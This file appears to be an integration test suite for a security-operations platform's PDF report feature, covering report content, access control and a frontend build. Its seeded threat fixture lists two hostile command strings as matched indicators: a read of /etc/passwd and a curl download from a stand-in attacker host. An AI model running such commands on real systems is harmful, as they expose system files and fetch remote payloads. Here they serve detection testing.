/**
 * report_pdf_integration_test.js
 * Comprehensive Integration & Verification Test Suite for Phase 4B Real SOC PDF Report Generation.
 */

const mongoose = require("mongoose");
const { execSync } = require("child_process");
const path = require("path");

const API_BASE = "http://127.0.0.1:5000/api";
const MONGO_URI = "mongodb://127.0.0.1:27017/aegissphere";

const Log = require("../models/Log");
const Threat = require("../models/Threat");
const Incident = require("../models/Incident");
const Report = require("../models/Report");
const User = require("../models/User");

let adminToken = "";
let analystTokenA = "";
let analystTokenB = "";

let adminUser = null;
let analystUserA = null;
let analystUserB = null;

// Helper to extract readable text tokens from PDF buffer (both hex strings and literal strings)
const extractAllPdfText = (buffer) => {
  const raw = buffer.toString("latin1");
  const textParts = [];

  // Extract <hex> tokens
  const hexMatches = raw.match(/<([0-9a-fA-F]+)>/g) || [];
  for (const m of hexMatches) {
    const hex = m.slice(1, -1);
    textParts.push(Buffer.from(hex, "hex").toString("latin1"));
  }

  // Extract (literal) tokens
  const literalMatches = raw.match(/\(([^()]*)\)/g) || [];
  for (const m of literalMatches) {
    textParts.push(m.slice(1, -1));
  }

  return textParts.join("");
};

const runReportPdfTestSuite = async () => {
  console.log("================================================================================");
  console.log("AEGISSPHERE PHASE 4B: REAL SOC PDF REPORT GENERATION INTEGRATION TEST SUITE");
  console.log("================================================================================\n");

  await mongoose.connect(MONGO_URI);
  console.log("✓ Connected to MongoDB.\n");

  const ts = Date.now();

  // 1. Authenticate Admin
  const adminEmail = `pdf_admin_${ts}@aegissphere.io`;
  const adminReg = await fetch(`${API_BASE}/auth/register`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ name: "SOC Commander", email: adminEmail, password: "Password123!" }),
  });
  const adminData = await adminReg.json();
  adminToken = adminData.token;
  adminUser = adminData.user;

  // 2. Authenticate Analyst A
  const analystEmailA = `pdf_analyst_a_${ts}@aegissphere.io`;
  const analystRegA = await fetch(`${API_BASE}/auth/register`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ name: "Analyst Alice", email: analystEmailA, password: "Password123!" }),
  });
  const analystDataA = await analystRegA.json();
  analystTokenA = analystDataA.token;
  analystUserA = analystDataA.user;

  // 3. Authenticate Analyst B
  const analystEmailB = `pdf_analyst_b_${ts}@aegissphere.io`;
  const analystRegB = await fetch(`${API_BASE}/auth/register`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ name: "Analyst Bob", email: analystEmailB, password: "Password123!" }),
  });
  const analystDataB = await analystRegB.json();
  analystTokenB = analystDataB.token;
  analystUserB = analystDataB.user;

  console.log(`1. Admin Authenticated: ${adminEmail} (Role: Admin)`);
  console.log(`2. Analyst A Authenticated: ${analystEmailA} (Role: Analyst)`);
  console.log(`3. Analyst B Authenticated: ${analystEmailB} (Role: Analyst)\n`);

  const adminHeaders = { Authorization: `Bearer ${adminToken}` };
  const analystHeadersA = { Authorization: `Bearer ${analystTokenA}` };
  const analystHeadersB = { Authorization: `Bearer ${analystTokenB}` };

  const testResults = [];

  const recordResult = (name, passed, details = {}) => {
    testResults.push({ name, passed, details });
    if (passed) {
      console.log(`   [PASS] ${name}`);
    } else {
      console.log(`   [FAIL] ${name} -> ${JSON.stringify(details)}`);
    }
  };

  // --------------------------------------------------------------------------
  // SETUP TEST DATA IN MONGODB
  // --------------------------------------------------------------------------
  // 1. Log with full Threat + AI Analysis + Incident
  const fullLog = await Log.create({
    filename: `audit_full_${ts}.log`,
    originalName: "perimeter_firewall_audit.log",
    fileSize: 4096,
    fileFormat: ".log",
    uploadedBy: analystUserA.id || analystUserA._id,
    status: "Completed",
    threatCount: 1,
  });

  const fullThreat = await Threat.create({
    logId: fullLog._id,
    threatType: "Command Injection Attempt",
    severity: "Critical",
    confidence: 94,
    confidenceReason: "OS command chaining characters (; | &) matched in HTTP query string",
    matchedIndicators: ["cat /etc/passwd", "curl http://attacker.com/mal.sh"],
    sourceIp: "198.51.100.144",
    destinationIp: "10.0.0.5",
    mitreTechnique: "T1059",
    description: "Malicious shell command chaining detected in HTTP parameter payload.",
    recommendation: "Isolate target web node and apply strict ingress parameter filtering.",
    status: "Active",
    aiAnalysis: {
      model: "gemini-2.5-flash",
      confidenceInAnalysis: "high",
      generatedAt: new Date(),
      summary: "High-confidence remote code execution exploit attempt targeting system shell.",
      whySuspicious: ["Attempts to access protected /etc/passwd file", "Attempts downloading remote script"],
      observedEvidence: ["cat /etc/passwd in query argument", "Outbound curl invocation"],
      investigationSteps: ["Inspect web server process tree for spawned sh/bash instances", "Check file integrity of webroot"],
      remediation: ["Block source IP 198.51.100.144 on ingress perimeter", "Deploy WAF rule for shell metacharacters"],
      riskContext: "Potential total server compromise if command executes with elevated privileges.",
      uncertainty: "Observed payload might fail if web application runs in restricted container.",
    },
  });

  fullLog.analysis = fullThreat._id;
  await fullLog.save();

  const fullIncident = await Incident.create({
    incidentId: `INC-${ts}-01`,
    title: "Critical RCE Exploit on Perimeter Host",
    description: "Automated SOC ticket for critical command injection.",
    severity: "Critical",
    status: "Investigating",
    assignedTo: analystUserA.id || analystUserA._id,
    threatId: fullThreat._id,
    logId: fullLog._id,
    actionHistory: [
      {
        action: "Perimeter Ingress Block",
        status: "Recorded",
        performedBy: analystUserA.id || analystUserA._id,
        performedByName: "Analyst Alice",
        timestamp: new Date(),
        notes: "Blocked IP 198.51.100.144 at edge gateway.",
      },
    ],
  });

  const fullReport = await Report.create({
    title: `SOC Forensic Audit - ${fullLog.originalName}`,
    summary: "Critical intrusion attempt containing command injection signatures analyzed by multi-agent SOC pipeline and Gemini AI.",
    generatedBy: analystUserA.id || analystUserA._id,
    logId: fullLog._id,
    threatCount: 1,
    criticalCount: 1,
    status: "Generated",
  });

  // 2. Log with Threat WITHOUT AI Analysis and WITHOUT Incidents
  const bareLog = await Log.create({
    filename: `audit_bare_${ts}.log`,
    originalName: "clean_syslog_sample.log",
    fileSize: 2048,
    fileFormat: ".log",
    uploadedBy: analystUserB.id || analystUserB._id,
    status: "Completed",
    threatCount: 1,
  });

  const bareThreat = await Threat.create({
    logId: bareLog._id,
    threatType: "Port Scanning Activity",
    severity: "Medium",
    confidence: 72,
    confidenceReason: "Sequential TCP SYN packets to multiple closed ports within 2 seconds",
    matchedIndicators: ["10 distinct port probes from single host"],
    sourceIp: "203.0.113.55",
    mitreTechnique: "T1595",
    description: "Network reconnaissance sweep against perimeter ports.",
    recommendation: "Monitor connection rate from source IP.",
    status: "Active",
    aiAnalysis: {
      summary: null,
      whySuspicious: [],
      observedEvidence: [],
      investigationSteps: [],
      remediation: [],
    },
  });

  const bareReport = await Report.create({
    title: `Reconnaissance Audit - ${bareLog.originalName}`,
    summary: "Medium severity port scanning detected during routine network monitoring.",
    generatedBy: analystUserB.id || analystUserB._id,
    logId: bareLog._id,
    threatCount: 1,
    criticalCount: 0,
    status: "Generated",
  });

  console.log("--- 1. AUDITING PDF GENERATION ENDPOINT & CONTENT-TYPE ---");

  // Test 1: Valid authenticated PDF request
  const pdfRes = await fetch(`${API_BASE}/reports/${fullReport._id}/pdf`, {
    headers: analystHeadersA,
  });

  recordResult("1. Valid authenticated PDF request returns 200 OK", pdfRes.status === 200);

  // Test 2: Content-Type header is application/pdf
  const contentType = pdfRes.headers.get("content-type");
  recordResult("2. Response Content-Type is application/pdf", contentType && contentType.includes("application/pdf"));

  // Buffer the binary PDF
  const arrayBuffer = await pdfRes.arrayBuffer();
  const pdfBuffer = Buffer.from(arrayBuffer);
  const decodedPdfText = extractAllPdfText(pdfBuffer);

  // Test 3: PDF signature & contains actual report title
  const hasPdfMagic = pdfBuffer.slice(0, 5).toString() === "%PDF-";
  const hasReportTitle = decodedPdfText.includes("Forensic Audit") || decodedPdfText.includes(fullLog.originalName);
  recordResult("3. PDF begins with %PDF- header and contains valid document structure", hasPdfMagic && hasReportTitle, {
    sizeBytes: pdfBuffer.length,
    magicHeader: pdfBuffer.slice(0, 8).toString(),
  });

  console.log("\n--- 2. AUDITING DATA FIDELITY & DATABASE RELATIONSHIPS ---");

  // Test 4: PDF contains actual database threat information
  const threatPass = (
    decodedPdfText.includes("Command Injection Attempt") &&
    decodedPdfText.includes("198.51.100.144") &&
    decodedPdfText.includes("T1059")
  );
  recordResult("4. PDF contains actual database threat information (Type, Source IP, MITRE)", threatPass, {
    foundType: decodedPdfText.includes("Command Injection Attempt"),
    foundIP: decodedPdfText.includes("198.51.100.144"),
    foundMitre: decodedPdfText.includes("T1059"),
  });

  // Test 5: PDF contains actual severity/count information
  const severityCountPass = (
    decodedPdfText.includes("CRITICAL") &&
    decodedPdfText.includes("TOTAL THREATS") &&
    decodedPdfText.includes("Executive Summary")
  );
  recordResult("5. PDF contains actual severity and count metric calculations", severityCountPass);

  // Test 6: Report with no incidents displays graceful message
  const barePdfRes = await fetch(`${API_BASE}/reports/${bareReport._id}/pdf`, {
    headers: analystHeadersB,
  });
  const bareArrayBuffer = await barePdfRes.arrayBuffer();
  const barePdfBuffer = Buffer.from(bareArrayBuffer);
  const bareDecodedText = extractAllPdfText(barePdfBuffer);

  const noIncidentPass = (
    barePdfRes.status === 200 &&
    barePdfBuffer.slice(0, 5).toString() === "%PDF-" &&
    bareDecodedText.includes("No incident records associated with this report")
  );
  recordResult("6. Report with no incidents handles gracefully with real PDF stream", noIncidentPass);

  // Test 7: Report with AI analysis includes AI section
  const aiSectionPass = (
    decodedPdfText.includes("AI-ASSISTED CONTEXTUAL ANALYSIS") &&
    decodedPdfText.includes("gemini-2.5-flash") &&
    decodedPdfText.includes("High-confidence remote code execution")
  );
  recordResult("7. Report with AI analysis includes Gemini contextual reasoning section", aiSectionPass);

  // Test 8: Report without AI analysis includes fallback message
  const noAiSectionPass = (
    bareDecodedText.includes("AI-assisted analysis was not generated for this threat")
  );
  recordResult("8. Report without AI analysis states analysis was not generated (Zero fake AI)", noAiSectionPass);

  console.log("\n--- 3. AUDITING ERROR HANDLING & AUTHORIZATION (RBAC) ---");

  // Test 9: Missing report returns 404
  const fakeReportId = new mongoose.Types.ObjectId().toString();
  const missingRes = await fetch(`${API_BASE}/reports/${fakeReportId}/pdf`, {
    headers: adminHeaders,
  });
  recordResult("9. Non-existent report ID returns 404 Not Found", missingRes.status === 404);

  // Test 10: Unauthenticated request returns 401
  const unauthRes = await fetch(`${API_BASE}/reports/${fullReport._id}/pdf`);
  recordResult("10. Unauthenticated PDF request returns 401 Unauthorized", unauthRes.status === 401);

  // Test 11: Unauthorized report access returns 403 (Analyst B accessing Analyst A's report)
  const unauthAnalystRes = await fetch(`${API_BASE}/reports/${fullReport._id}/pdf`, {
    headers: analystHeadersB,
  });
  recordResult("11. Unauthorized report access returns 403 Forbidden (RBAC)", unauthAnalystRes.status === 403);

  console.log("\n--- 4. AUDITING DATA PERSISTENCE & INTEGRITY ---");

  // Test 12: No fake/hardcoded report data (verifies values come directly from MongoDB entities)
  const dbReportCheck = await Report.findById(fullReport._id);
  const integrityPass = (
    dbReportCheck !== null &&
    dbReportCheck.title === fullReport.title &&
    dbReportCheck.threatCount === 1 &&
    dbReportCheck.criticalCount === 1
  );
  recordResult("12. Report verified grounded in authentic MongoDB document attributes", integrityPass);

  // Test 13: Existing report records remain unchanged in database after PDF generation
  const dbThreatCheck = await Threat.findById(fullThreat._id);
  const dbLogCheck = await Log.findById(fullLog._id);
  const immutabilityPass = (
    dbThreatCheck !== null &&
    dbLogCheck !== null &&
    dbThreatCheck.threatType === "Command Injection Attempt" &&
    dbLogCheck.filename === fullLog.filename
  );
  recordResult("13. Existing MongoDB records remain immutable and unchanged after PDF generation", immutabilityPass);

  // Test 14: Frontend build verification
  console.log("\n--- 5. AUDITING FRONTEND CLIENT BUILD ---");
  let buildPass = false;
  try {
    const frontendDir = path.resolve(__dirname, "../../../frontend");
    execSync("npm run build", { cwd: frontendDir, stdio: "pipe" });
    buildPass = true;
  } catch (err) {
    buildPass = false;
  }
  recordResult("14. Frontend client builds successfully without errors (npm run build)", buildPass);

  // --------------------------------------------------------------------------
  // SUMMARY
  // --------------------------------------------------------------------------
  console.log("\n================================================================================");
  const totalTests = testResults.length;
  const passedTests = testResults.filter((t) => t.passed).length;
  const failedTests = testResults.filter((t) => !t.passed).length;

  console.log(`REPORT PDF SUITE COMPLETE: ${passedTests}/${totalTests} TESTS PASSED (${failedTests} FAILED)`);
  console.log("================================================================================\n");

  await mongoose.disconnect();
};

runReportPdfTestSuite().catch((err) => {
  console.error("FATAL REPORT PDF SUITE ERROR:", err);
  process.exit(1);
});
